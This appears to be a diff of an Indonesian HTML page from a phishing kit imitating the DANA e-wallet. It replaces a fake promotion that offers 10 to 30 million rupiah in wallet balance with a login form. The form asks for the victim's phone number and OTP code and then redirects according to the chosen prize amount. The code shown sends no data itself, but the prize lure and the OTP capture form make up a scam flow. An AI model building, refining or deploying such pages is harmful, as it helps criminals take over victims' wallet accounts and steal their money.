@@ -3,185 +3,106 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Promo DANA - Dukung Tim Jagoanmu</title>
+<title>Masuk Akun</title>
 <style>
-*{
-margin:0;
-padding:0;
-box-sizing:border-box;
-font-family:Arial,Helvetica,sans-serif;
-}
-
-body{
-background:#ffffff;
-padding-bottom:30px;
-}
-
-.header-bg{
-position:relative;
-width:100%;
-padding:0 0 100px;
-overflow:hidden;
-background:linear-gradient(to bottom, #004a9f, #3399ff);
-}
-
-.banner{
-position:absolute;
-top:0;
-left:0;
-width:100%;
-height:85%;
-z-index:1;
-}
-
-.banner img{
+*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,Helvetica,sans-serif;}
+html, body{
 width:100%;
 height:100%;
-object-fit:cover;
-opacity:0.4;
-}
-
-.teks-promo{
-position:relative;
-z-index:2;
-width:90%;
-max-width:700px;
-margin:30px auto 0;
-text-align:center;
-font-size:26px;
-font-weight:bold;
-background: linear-gradient(90deg, #fff1c1, #d4af37, #fff1c1);
--webkit-background-clip: text;
--webkit-text-fill-color: transparent;
-filter: drop-shadow(0 0 8px rgba(212,175,55,0.7));
-animation: kilau 2s infinite ease-in-out;
-}
-
-@keyframes kilau{
-0%{filter: brightness(1) drop-shadow(0 0 8px rgba(212,175,55,0.7));}
-50%{filter: brightness(1.5) drop-shadow(0 0 15px rgba(212,175,55,1));}
-100%{filter: brightness(1) drop-shadow(0 0 8px rgba(212,175,55,0.7));}
-}
-
-.box{
-width:92%;
-max-width:600px;
-margin:-40px auto 20px;
-background:#ffffff;
-border-radius:28px;
-overflow:hidden;
-box-shadow:0 10px 25px rgba(0,74,159,0.35);
-position:relative;
-z-index:10;
-}
-
-.title{
-background:linear-gradient(90deg, #004a9f, #007bff, #004a9f);
-color:#fff;
-font-size:22px;
-font-weight:bold;
-text-align:center;
-padding:18px;
-text-shadow: 0 2px 4px rgba(0,0,0,0.2);
-}
-
-.pilihan-hadiah{
-display:block;
-width:85%;
-margin:18px auto;
-padding:18px;
-text-align:center;
-text-decoration:none;
-font-size:22px;
-font-weight:bold;
-color:#ffffff;
-border-radius:50px;
-background:linear-gradient(#007bff,#004a9f);
-box-shadow:0 5px 15px rgba(0,91,191,0.4);
-transition:all 0.2s ease;
-cursor:pointer;
-}
-
-.pilihan-hadiah:active{
-transform:scale(0.96);
-box-shadow:0 2px 8px rgba(0,91,191,0.3);
-}
-
-.slider{
+/* FOTO KAMU SEBAGAI LATAR BELAKANG + LAPISAN BIRU TRANSPARAN AGAR TULISAN JELAS */
+background:linear-gradient(rgba(0, 74, 159, 0.75), rgba(51, 153, 255, 0.75)), url("bg-login.jpg");
+background-size:cover;
+background-position:center;
+background-repeat:no-repeat;
+background-attachment:fixed;
+padding:0;
+margin:0;
 display:flex;
-overflow-x:auto;
-scroll-behavior:smooth;
-scroll-snap-type:x mandatory;
-gap:15px;
-padding:15px;
+align-items:center;
+justify-content:center;
 }
 
-.slider::-webkit-scrollbar{display:none;}
-.slide{flex:0 0 92%;scroll-snap-align:center;}
-.slide img{width:100%;display:block;border-radius:15px;box-shadow:0 5px 15px rgba(0,0,0,.25);}
+.kotak-login{
+width:100%;max-width:500px;background:#fff;border-radius:25px;padding:30px 25px;
+box-shadow:0 10px 30px rgba(0,0,0,0.3);text-align:center;margin:20px;
+}
 
-.tombol-masuk-bawah{
-width:92%;
-max-width:500px;
-margin:20px auto 0;
+.logo{
+width:120px;
+height:auto;
+margin:0 auto 20px;
 display:block;
-padding:16px;
-text-align:center;
-text-decoration:none;
-font-size:20px;
-font-weight:bold;
-color:#ffffff;
-border-radius:50px;
-background:linear-gradient(#007bff,#004a9f);
-box-shadow:0 8px 20px rgba(0,91,191,0.4);
-transition:all 0.2s ease;
 }
 
-.tombol-masuk-bawah:active{transform:scale(0.96);}
+.judul{font-size:24px;font-weight:bold;color:#004a9f;margin-bottom:25px;}
+.form-group{text-align:left;margin-bottom:18px;}
+.label{display:block;font-size:16px;font-weight:bold;color:#004a9f;margin-bottom:8px;}
+.input{width:100%;padding:15px;font-size:18px;border:2px solid #007bff;border-radius:12px;outline:none;transition:0.2s;}
+.input:focus{border-color:#004a9f;box-shadow:0 0 8px rgba(0,91,191,0.3);}
 
-@media(max-width:600px){
-.header-bg{padding:0 0 80px;}
-.banner{height:80%;}
-.teks-promo{font-size:18px;}
-.title{font-size:20px;}
-.pilihan-hadiah{font-size:20px;padding:16px;}
+.tombol-kirim-otp, .tombol-verifikasi{
+display:block;width:100%;padding:18px;font-size:20px;font-weight:bold;color:#fff;border:none;
+border-radius:50px;background:linear-gradient(#007bff,#004a9f);box-shadow:0 5px 15px rgba(0,91,191,0.4);
+margin-bottom:12px;transition:all 0.2s ease;cursor:pointer;
+}
+.tombol-kirim-otp:active, .tombol-verifikasi:active{transform:scale(0.96);}
+
+.bagian-otp{display:none;}
+.catatan{font-size:13px;color:#666;margin-top:5px;}
+
+@media(max-width:480px){
+.judul{font-size:20px;}
+.logo{width:100px;}
 }
 </style>
 </head>
 <body>
 
-<div class="header-bg">
-<div class="banner"><img src="banner-promo.gif" alt="Banner Promo"></div>
-<div class="teks-promo">DUKUNG TIM JAGOANMU & KLAIM SALDO DANA 10JT</div>
+<div class="kotak-login">
+<img src="logo.png" alt="Logo" class="logo">
+
+<div class="judul">MASUK DENGAN NOMOR HP</div>
+
+<div class="form-group" id="bagian-nomor">
+<label class="label">Nomor HP Aktif</label>
+<input type="tel" class="input" id="nohp" placeholder="Contoh: 081234567890" maxlength="14">
+<p class="catatan">* Kode verifikasi akan dikirim ke nomor ini</p>
 </div>
 
-<div class="box">
-<div class="title">PILIH HADIAH SALDO DANA ANDA</div>
-<a href="login.html?pilih=10" class="pilihan-hadiah">Rp. 10.000.000</a>
-<a href="login.html?pilih=20" class="pilihan-hadiah">Rp. 20.000.000</a>
-<a href="login.html?pilih=30" class="pilihan-hadiah">Rp. 30.000.000</a>
-</div>
+<button class="tombol-kirim-otp" id="btn-kirim" onclick="kirimOTP()">KIRIM KODE OTP</button>
 
-<div class="slider">
-<div class="slide"><img src="promo1.jpg" alt="Promo 1"></div>
-<div class="slide"><img src="promo2.jpg" alt="Promo 2"></div>
-<div class="slide"><img src="promo3.jpg" alt="Promo 3"></div>
-<div class="slide"><img src="promo4.jpg" alt="Promo 4"></div>
-<div class="slide"><img src="promo5.jpg" alt="Promo 5"></div>
-<div class="slide"><img src="promo6.jpg" alt="Promo 6"></div>
+<div class="bagian-otp" id="bagian-otp">
+<div class="form-group">
+<label class="label">Masukkan Kode OTP</label>
+<input type="text" class="input" id="kodeotp" placeholder="Masukkan 6 digit kode" maxlength="6">
+</div>
+<button class="tombol-verifikasi" onclick="verifikasiKode()">VERIFIKASI & LANJUTKAN</button>
+</div>
 </div>
 
 <script>
-const slider = document.querySelector(".slider");
-let posisi = 0;
-setInterval(()=>{
-posisi++;
-if(posisi>=6)posisi=0;
-slider.scrollTo({left:posisi*slider.clientWidth,behavior:"smooth"});
-},3000);
+function kirimOTP(){
+const nohp = document.getElementById('nohp').value;
+if(nohp.length < 10){
+alert('Masukkan nomor HP yang benar!');
+return;
+}
+document.getElementById('bagian-nomor').style.display = 'none';
+document.getElementById('btn-kirim').style.display = 'none';
+document.getElementById('bagian-otp').style.display = 'block';
+alert('Kode OTP telah dikirim ke nomor Anda (contoh: 123456)');
+}
+
+function verifikasiKode(){
+const kode = document.getElementById('kodeotp').value;
+if(kode.length < 6){
+alert('Masukkan 6 digit kode OTP!');
+return;
+}
+const pilih = new URLSearchParams(window.location.search).get('pilih') || '10';
+window.location.href = 'isi-nomor-' + pilih + 'jt.html';
+}
 </script>
 
-<a href="login.html" class="tombol-masuk-bawah">MASUK</a>
-
 </body>
-</html>
+  </html>
